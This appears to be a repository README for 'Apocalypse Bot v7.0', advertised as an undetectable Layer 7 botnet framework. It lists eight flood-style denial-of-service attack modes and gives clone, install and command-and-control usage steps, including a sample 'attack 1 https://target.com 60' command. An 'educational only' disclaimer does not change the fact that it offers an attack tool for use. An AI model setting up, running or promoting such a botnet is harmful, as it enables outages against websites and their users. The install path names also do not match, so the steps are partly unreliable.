# 💀 APOCALYPSE BOT v7.0

**Undetectable Layer 7 Botnet Framework for Educational Testing**

**BY: 𝙳𝚎𝚊𝚝Nex**

---

## DISCLAIMER

> **EDUCATIONAL PURPOSE ONLY!**  
> Use only on your own servers or with written permission.  
> Unauthorized use is a CRIMINAL OFFENSE (UU ITE Pasal 30-46).

---

FEATURES

| Mode | Attack Type 
|------|-------------------
| 1    | HTTP L7 Flood 
| 2    | HTTPS L7 Flood 
| 3    | Slowloris L7 
| 4    | HTTP Pipelining L7 
| 5    | WebSocket L7 Flood 
| 6    | TLS Renegotiation L7
| 7    | DNS over HTTPS
| 8    | ALL L7 MODES

---

## 📦 INSTALLATION

```bash
git clone https://github.com/DeatSec/Apocalypse-Bot.git
cd Apocalypse-Bot
pip install -r requirements.txt

---

USAGE SERVER AND BOT 

1. cd Apocalypse-Suite
2. python server/c2_server.py  
3. python client/apocalypse_bot.py
   [?] C2 IP (default: 127.0.0.1):
    *Satu perangkat → langsung tekan Enter
    *Beda perangkat → ketik IP server (contoh: 192.168.1.100)
   [C2] > attack 1 https://target.com 60
   Command Format: attack <mode 1,2,3,...> <target> <duration>
